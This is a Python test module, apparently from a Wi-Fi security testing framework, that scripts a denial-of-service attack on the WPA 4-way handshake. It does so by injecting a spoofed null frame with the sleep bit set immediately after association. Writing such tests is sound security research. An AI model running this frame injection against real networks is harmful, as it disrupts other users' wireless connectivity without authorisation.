from dependencies.libwifi.wifi import *
from library.testcase import Trigger, Action, Test
from scapy.all import Dot11, Dot11QoS, Raw


class Queueing4wayHandshakeAttack(Test):
    """
    Test for queueing-based DoS attack during 4-way handshake.
    Attack: Spoof null-frame with sleep-bit IMMEDIATELY after association.
    """
    name = "4wh-queue"
    kind = Test.Supplicant

    def __init__(self):
        super().__init__([
            Action(trigger=Trigger.Connected, action=Action.Function),
            Action(trigger=Trigger.Connected, action=Action.Reconnect),
            Action(trigger=Trigger.Associated, action=Action.Inject),
            Action(trigger=Trigger.Associated, action=Action.Terminate)
        ])

    def on_initial_connect(self, station):
        log(STATUS, 'Initial connection successful.', color="green")

    def create_sleep_null_frame(self, station):
        """Create proper null-frame with sleep-bit."""
        # Create base Dot11 frame
        frame = Dot11(
            addr1=station.bss,
            addr2=station.mac,
            addr3=station.bss,
            SC=0,
            subtype=4      # Null frame
        )

        # Add QoS header
        frame = frame / Dot11QoS(TID=0)

        # NOW set to_ds AFTER frame creation
        frame.to_ds = 1

        # Set Power Management bit (sleep bit)
        frame.PwrMgt = 1

        log(STATUS,
            f'Sleep-bit frame created for {station.mac}', color="orange")
        return frame



    def generate(self, station):
        self.actions[0].set_function(self.on_initial_connect)
        self.actions[0].set_delay(0.5)

        # Reconnect to the AP
        self.actions[1].set_delay(2)  # Delay before reconnecting

        # Inject sleep-bit frame after association
        sleep_frame = self.create_sleep_null_frame(station)
        self.actions[2].set_frame(sleep_frame, mon=True, encrypt=False)
        self.actions[2].set_delay(0)  # Inject immediately after association

        self.actions[3].set_terminate(delay=20)  # Terminate after 20 seconds
